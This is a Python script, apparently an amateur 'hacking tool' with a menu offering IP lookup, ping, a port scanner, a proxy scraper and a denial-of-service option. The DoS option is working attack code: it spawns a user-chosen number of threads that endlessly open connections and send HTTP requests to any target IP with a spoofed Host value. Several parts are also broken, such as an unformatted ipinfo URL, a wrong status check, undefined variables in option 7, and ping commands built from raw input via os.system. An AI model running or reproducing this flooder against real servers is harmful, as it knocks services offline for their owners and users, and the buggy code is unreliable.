import requests
import colorama
from colorama import Fore
import pystyle
import threading
from threading import Thread
import os
import time
import socket
import nmap
import random
import fake_headers 
from fake_headers import Headers
banner = f"""{Fore.BLUE}

                 ___-----------___
           __--~~                 ~~--__
       _-~~                             ~~-_
    _-~                                     ~-_
   /                                           \
  |                                             |
 |                                               |
 |                                               |
|                                                 |
|                                                 |
|                                                 |
 |                                               |
 |  |    _-------_               _-------_    |  |
 |  |  /~         ~\           /~         ~\  |  |
  ||  |             |         |             |  ||
  || |               |       |               | ||
  || |              |         |              | ||
  |   \_           /           \           _/   |
 |      ~~--_____-~    /~V~\    ~-_____--~~      |
 |                    |     |                    |
|                    |       |                    |
|                    |  /^\  |                    |
 |                    ~~   ~~                    |
  \_         _                       _         _/
    ~--____-~ ~\                   /~ ~-____--~
         \     /\                 /\     /
          \    | ( ,           , ) |    /
           |   | (~(__(  |  )__)~) |   |
            |   \/ (  (~~|~~)  ) \/   |
             |   |  [ [  |  ] ]  /   |
              |                     |
               \                   /
                ~-_             _-~
                   ~--___-___--~

"""
print(banner)


print(f"{Fore.GREEN}Starting..")
time.sleep(4)
os.system('cls')
while True:
    print(f"""{Fore.WHITE}
    \t\t\t\t██╗    ██╗ ██╗███████╗
    \t\t\t\t██║    ██║███║██╔════╝
    \t\t\t\t██║ █╗ ██║╚██║███████╗
    \t\t\t\t██║███╗██║ ██║╚════██║
    \t\t\t\t╚███╔███╔╝ ██║███████║
    \t\t\t\t ╚══╝╚══╝  ╚═╝╚══════╝
    ════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════                  
                        [01] Ip information          [04] DoS                    [07] Ping web                
                        [02] Ping IP                 [05] Port scanner           [08] Soon...           
                        [03] URL to ip               [06] Proxy scraper          [>>] Next page 
    """)
    opc = input("$>>")

    if opc == '1':
        i1 = input("[+]IP: ")
        def verificar_ip():
            print("[?]Checking IP...")
            time.sleep(4)
            url = "https://ipinfo.io/{i1}"

            r = requests.get(url)

            if r.status_code == '404':
                print("[-]This ip dont exist")
                time.sleep(3)
            else:
                print("[+]Ip found")
                time.sleep(2)
                print("[?]Getting info...")
                time.sleep(3)
                print("[+]Info founded!")
                api = f"https://ipinfo.io/{i1}"
                response = requests.get(api)
                data = response.json()
                print("Información de la IP:")
                print("IP:", data.get('ip'))
                print("Hostname:", data.get('hostname'))
                print("Ciudad:", data.get('city'))
                print("Región:", data.get('region'))
                print("País:", data.get('country'))
                print("Proveedor de servicio de Internet (ISP):", data.get('org'))
                print("Latitud, Longitud:", data.get('loc'))
                time.sleep(12)
            
        verificar_ip()
    if opc == '':
        print("[X]Selecet a option")
        time.sleep(3)
        os.system('cls')
        continue

    if opc == '2':
        i2 = input("[+]IP: ")
        c1 = input("[?]Number of pings: ")


        comando = f'ping -n {c1} {i2}'

        resultado = os.system(comando)
        
        if resultado == 0:
            print("Ping completed...")


    if opc == '3':
        u1 = input("[+]URL: ")
        direccion_ip = socket.gethostbyname(u1)
        print(f"La dirección IP de {u1} es: {direccion_ip}")

    if opc == '4':
        target = str(input("Insert target's IP: "))
        port = int(input("Insert Port: "))
        Trd = int(input("Insert number of Threads: "))
        fake_ip = '44.197.175.168'

        def attack():
            while True:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
                s.close()

        attack_num = 0

        def print_attack_num():
            global attack_num
            while True:
                print("Attack number:", attack_num)
                attack_num += 1

        for i in range(Trd):
            thread = threading.Thread(target=attack)
            thread.start()

        thread = threading.Thread(target=print_attack_num)
        thread.start()


    if opc == '5':
        def port_scan():
            target_host = input("Introduce la dirección IP o el nombre del host a escanear: ")
            
            print("Escaneando puertos abiertos en", target_host)
            for port in range(1, 1025):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    
                    s.settimeout(1)
                    
                    result = s.connect_ex((target_host, port))
                    
                    if result == 0:
                        print(f"Puerto {port} abierto")
                    
                    s.close()
                
                except KeyboardInterrupt:
                    print("\nEscaneo cancelado.")
                    break
                
                except socket.gaierror:
                    print("No se pudo resolver el nombre del host.")
                    break
                
                except socket.error:
                    print("No se pudo conectar al servidor.")
                    break

        if __name__ == "__main__":
            port_scan()

    if opc == '6':
        archivo = 'results.txt'


        url = 'https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&proxy_format=ipport&format=text'




        headers = Headers(headers=True).generate()


        def proxies_gen():
            response = requests.get(url, headers=headers)
            print(f"{Fore.BLUE}[@] Getting proxies...")
            time.sleep(5)

            if response.status_code == 200:
                with open(archivo , 'w') as f:
                    f.write(response.text)
                    print(f"{Fore.GREEN}[+]Proxies saved in Results.txt")

        proxies_gen()
    if opc == '7':
        u2 = input("[+]URL: ")
        c2 = input("[?]Number of pings: ")


        comando = f'ping -n {c1} {i2}'

        resultado = os.system(comando)
        
        if resultado == 0:
            print("Ping completed...")

